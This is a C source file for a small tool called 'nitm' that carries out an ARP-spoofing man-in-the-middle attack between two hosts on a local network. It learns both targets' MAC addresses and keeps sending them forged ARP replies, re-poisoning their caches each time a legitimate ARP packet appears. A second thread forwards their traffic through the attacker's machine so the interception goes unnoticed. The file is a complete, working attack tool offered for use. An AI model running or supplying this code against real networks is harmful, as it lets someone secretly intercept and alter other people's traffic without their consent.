#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <libnet.h>
#include "nitm.h"

void get_mac_address(libnet_t *libnet_context, pcap_t *handle, u_int32_t my_ip, struct libnet_ether_addr *my_mac, u_int32_t target_ip, struct libnet_ether_addr *future_target_mac);
void process_packet (u_char *user, const struct pcap_pkthdr *header, const u_char * packet);
void spoof (libnet_t *libnet_context, u_int32_t ip_target, u_int32_t ip_spoof, struct libnet_ether_addr mac_target, struct libnet_ether_addr *my_mac);
void spoof_back(u_char *user, const struct pcap_pkthdr *header, const u_char * packet);

void *pipe_main(void*d);
void pipe_packet (u_char *user, const struct pcap_pkthdr *header, const u_char * packet);

void print_usage();

int main(int argc, char **argv){
	char *device;
	char errbuf[PCAP_ERRBUF_SIZE];

	libnet_t *l; //libnet context

	u_int32_t my_ip, ip_target_one, ip_target_two;
	struct libnet_ether_addr *my_mac, mac_target_one, mac_target_two;

	pcap_t *arp_handle;

	struct bpf_program filter_program;
	
	pthread_t pipe_thread;

	if(argc == 4)
		device = argv[1];
	else if(argc == 3)
		device = pcap_lookupdev(errbuf);
	else{
		print_usage();
		exit(1);
	}

	if(device == NULL){
		printf("Device error: %s\n", errbuf);
		exit(1);
	}

	l = libnet_init(LIBNET_LINK, device, errbuf);

	if(l == NULL){
		printf("Libnet init error: %s\nAre you root?\n", errbuf);
		exit(1);
	}

	ip_target_one = libnet_name2addr4(l, argv[argc - 2], LIBNET_RESOLVE);
	ip_target_two = libnet_name2addr4(l, argv[argc - 1], LIBNET_RESOLVE);
	my_mac = libnet_get_hwaddr(l);
	my_ip = libnet_get_ipaddr4(l);

	arp_handle = pcap_open_live(device, BUFSIZ, 1, -1, errbuf);

	if(arp_handle == NULL){
		printf("Could not open device %s: %s\n", device, errbuf);
		exit(1);
	}

	if(pcap_datalink(arp_handle) != DLT_EN10MB){
		printf("%s is not an Ethernet device.\n", device);
		exit(1);
	}

	pcap_compile(arp_handle, &filter_program, "arp", 0, PCAP_NETMASK_UNKNOWN);
	pcap_setfilter(arp_handle, &filter_program);

	get_mac_address(l, arp_handle, my_ip, my_mac, ip_target_one, &mac_target_one);
	get_mac_address(l, arp_handle, my_ip, my_mac, ip_target_two, &mac_target_two);
	
	void * pipe_params[4] = { device, my_mac, &mac_target_one, &mac_target_two };
	
	pthread_create(&pipe_thread, NULL, pipe_main, pipe_params);
	
	void * params[4] = { my_mac, &ip_target_one, &ip_target_two, arp_handle };
	
	for(;;){
		spoof (l, ip_target_one, ip_target_two, mac_target_one, my_mac);
		spoof (l, ip_target_two, ip_target_one, mac_target_two, my_mac);
		
		pcap_loop (arp_handle, -1, spoof_back, (u_char *) params);
	}
	
	pthread_join(pipe_thread, NULL);
	
	pcap_close(arp_handle);
	libnet_destroy(l);
	return 0;
}

void get_mac_address(libnet_t *libnet_context, pcap_t *handle, u_int32_t my_ip, struct libnet_ether_addr *my_mac, u_int32_t target_ip, struct libnet_ether_addr *future_target_mac){
	libnet_ptag_t arp = 0, eth = 0;
	u_int8_t broadcast_ether[6];
	int s = 0;

	memset(broadcast_ether, 0xff, ETHER_ADDR_LEN);

	arp = libnet_autobuild_arp(ARPOP_REQUEST, (u_int8_t *) my_mac, (u_int8_t *) &my_ip, (u_int8_t *) broadcast_ether, (u_int8_t *) &target_ip, libnet_context);

	if(arp == -1){
		printf("An error occured while building the ARP header. %s\n", libnet_geterror(libnet_context));
		exit(1);
	}

	eth = libnet_build_ethernet((u_int8_t *) broadcast_ether, (u_int8_t *) my_mac, ETHERTYPE_ARP, NULL, 0, libnet_context, 0);

	if(eth == -1){
		printf("An error occured while building the Ethernet header. %s\n", libnet_geterror(libnet_context));
		exit(1);
	}

	void * params[3] = { &target_ip, future_target_mac, handle };

	while(s == 0){
		if(libnet_write(libnet_context) == -1){
			printf("An error occured while sending the packet. %s\n", libnet_geterror(libnet_context));
			exit(1);
		}

		printf("Looking for MAC of %s\n", libnet_addr2name4(target_ip, LIBNET_DONT_RESOLVE));


		s = pcap_loop(handle, 10, process_packet, (u_char *) params);

	}


}

void process_packet (u_char *user, const struct pcap_pkthdr *header, const u_char * packet){

	void ** params = (void**) user;

	u_int32_t *target_ip = (u_int32_t *) params[0];
	struct libnet_ether_addr *future_target_mac = (struct libnet_ether_addr *) params[1];
	pcap_t *handle = (pcap_t *) params[2];

	struct etherhdr *eth_header;
	struct ether_arp *arp_packet;

	eth_header = (struct etherhdr *) packet;

	if(ntohs(eth_header->ether_type) == ETHERTYPE_ARP){
		arp_packet = (struct ether_arp *) (packet + (ETHER_ADDR_LEN + ETHER_ADDR_LEN + 2));

		if(ntohs(arp_packet->ea_hdr.ar_op) == 2 && !memcmp (target_ip, arp_packet->arp_spa, 4)){
			memcpy(future_target_mac, eth_header->ether_shost, 6);
			
			printf ("Target: %d.%d.%d.%d is at: %02x:%02x:%02x:%02x:%02x:%02x\n", 	
					arp_packet->arp_spa[0],
					arp_packet->arp_spa[1],
					arp_packet->arp_spa[2],
					arp_packet->arp_spa[3],	

					((struct libnet_ether_addr) *future_target_mac).ether_addr_octet[0],
					((struct libnet_ether_addr) *future_target_mac).ether_addr_octet[1],
					((struct libnet_ether_addr) *future_target_mac).ether_addr_octet[2],
					((struct libnet_ether_addr) *future_target_mac).ether_addr_octet[3],
					((struct libnet_ether_addr) *future_target_mac).ether_addr_octet[4],
					((struct libnet_ether_addr) *future_target_mac).ether_addr_octet[5]);

			pcap_breakloop (handle);
		}
	}
}

void spoof (libnet_t *libnet_context, u_int32_t ip_target, u_int32_t ip_spoof, struct libnet_ether_addr mac_target, struct libnet_ether_addr *my_mac){
	libnet_ptag_t arp = 0, eth = 0;
	
	arp = libnet_autobuild_arp(ARPOP_REPLY, (u_int8_t *) my_mac, (u_int8_t *) &ip_spoof, (u_int8_t *) &mac_target, (u_int8_t *) &ip_target, libnet_context);
	if(arp == -1){
		printf("An error occured while building the ARP header: %s\n", libnet_geterror(libnet_context));
		exit(1);
	}
	
	eth = libnet_build_ethernet((u_int8_t *) &mac_target, (u_int8_t *) my_mac, ETHERTYPE_ARP, NULL, 0, libnet_context, 0);
	if(eth == -1){
		printf("An error occured while building the ethernet header: %s\n", libnet_geterror(libnet_context));
		exit(1);
	}
	printf ("Spoofing %s to %s\n", libnet_addr2name4 (ip_spoof, LIBNET_DONT_RESOLVE), libnet_addr2name4 (ip_target, LIBNET_DONT_RESOLVE));
	
	if((libnet_write(libnet_context)) == -1){
		printf("An error occured while sending the packet. %s\n", libnet_geterror(libnet_context));
		exit(1);
	}
	libnet_clear_packet(libnet_context);
}

void spoof_back(u_char *user, const struct pcap_pkthdr *header, const u_char * packet){
	void ** params = (void**) user;

	struct libnet_ether_addr *my_mac_ptr = (struct libnet_ether_addr *) params[0];
	struct libnet_ether_addr my_mac = ((struct libnet_ether_addr) *my_mac_ptr); //doesn't work directly fsr ?!
	u_int32_t *ip_target_one = (u_int32_t *) params[1];
	u_int32_t *ip_target_two = (u_int32_t *) params[2];
	pcap_t *handle = (pcap_t *) params[3];
	
	struct etherhdr *eth_header;
	struct ether_arp *arp_packet;
	
	eth_header = (struct etherhdr *) packet;
	
	if(ntohs(eth_header->ether_type) == ETHERTYPE_ARP){
		arp_packet = (struct ether_arp *) (packet + (ETHER_ADDR_LEN + ETHER_ADDR_LEN + 2));
		
		if (	ntohs (arp_packet->ea_hdr.ar_op) == 2 && 
				memcmp (my_mac.ether_addr_octet, eth_header->ether_shost, 6) &&
				(!memcmp (ip_target_one, arp_packet->arp_spa, 4) || !memcmp (ip_target_two, arp_packet->arp_spa, 4))) {

			printf ("Target: %d.%d.%d.%d sent legitimate ARP packet. Spoofing...\n", 	
					arp_packet->arp_spa[0],
					arp_packet->arp_spa[1],
					arp_packet->arp_spa[2],
					arp_packet->arp_spa[3]);

			pcap_breakloop (handle);
		}
		
		if (	ntohs (arp_packet->ea_hdr.ar_op) == 1 && 
			memcmp (my_mac.ether_addr_octet, eth_header->ether_shost, 6) &&
			(!memcmp (ip_target_one, arp_packet->arp_tpa, 4) || !memcmp (ip_target_two, arp_packet->arp_tpa, 4))) {

			printf ("Someone is asking for the MAC of one of the targets. Spoofing...\n", 	
					arp_packet->arp_spa[0],
					arp_packet->arp_spa[1],
					arp_packet->arp_spa[2],
					arp_packet->arp_spa[3]);

			pcap_breakloop (handle);
		}
	}

}

void *pipe_main(void *d){
	void ** params = (void**) d;
	
	char *device = (char *) params[0];
	
	pcap_t *pipe_handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	
	pipe_handle = pcap_open_live(device, BUFSIZ, 1, -1, errbuf);
	
	if(pipe_handle == NULL){
		printf("Could not open device %s: %s\n", device, errbuf);
		exit(1);
	}

	if(pcap_datalink(pipe_handle) != DLT_EN10MB){
		printf("%s is not an Ethernet device.\n", device);
		exit(1);
	}
	
	params[0] = pipe_handle;
	
	printf("Started pipe thread.\n");
	pcap_loop (pipe_handle, -1, pipe_packet, (u_char *) params);
	
}

void pipe_packet (u_char *user, const struct pcap_pkthdr *header, const u_char * packet){
	void ** params = (void**) user;
		
	pcap_t *handle = (pcap_t *) params[0];
	struct libnet_ether_addr *my_mac = (struct libnet_ether_addr *) params[1];
	struct libnet_ether_addr *mac_target_one = (struct libnet_ether_addr *) params[2];
	struct libnet_ether_addr *mac_target_two = (struct libnet_ether_addr *) params[3];
	
	struct etherhdr *eth_header;
	
	eth_header = (struct etherhdr *) packet;
	
	if(ntohs(eth_header->ether_type) == ETHERTYPE_ARP)
		return;
		
	if(!memcmp((*my_mac).ether_addr_octet, eth_header->ether_dhost, 6)){// am i destination
		if(!memcmp((*mac_target_one).ether_addr_octet, eth_header->ether_shost, 6)){
			u_char new_packet[header->len];
			//set destination to t2
			memcpy(&new_packet[0], mac_target_two, 6);
			//set source to me
			memcpy(&new_packet[6], my_mac, 6);
			//copy data from original packet
			memcpy(&new_packet[12], &packet[12], header->len - 12);

		    pcap_sendpacket(handle, new_packet, header->len);
		}
		
		if(!memcmp((*mac_target_two).ether_addr_octet, eth_header->ether_shost, 6)){
			u_char new_packet[header->len];
			//set destination to t1
			memcpy(&new_packet[0], mac_target_one, 6);
			//set source to me
			memcpy(&new_packet[6], my_mac, 6);
			//copy data from original packet
			memcpy(&new_packet[12], &packet[12], header->len - 12);

		    pcap_sendpacket(handle, new_packet, header->len);
		}
	}
}

void print_usage(){
	printf("nitm v0.1 by frequem\n");
	printf("Usage: app <interface> <target_one_ip> <target_two_ip>\n");
	printf("or app <target_one_ip> <target_two_ip>\n");
	printf("e.g. app eth0 192.168.0.1 192.168.0.6\n");
}
